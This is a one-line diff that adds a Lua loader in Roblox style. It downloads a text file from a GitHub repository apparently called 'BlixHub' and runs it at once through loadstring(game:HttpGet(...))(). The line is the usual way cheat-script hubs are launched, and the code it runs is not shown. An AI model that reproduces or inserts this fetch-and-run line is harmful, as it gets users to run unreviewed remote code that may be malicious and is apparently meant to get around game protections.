@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kanyeeats/BlixHub/refs/heads/main/dbe39725af2b4e478f38d848436fc20b%20(1).txt"))()
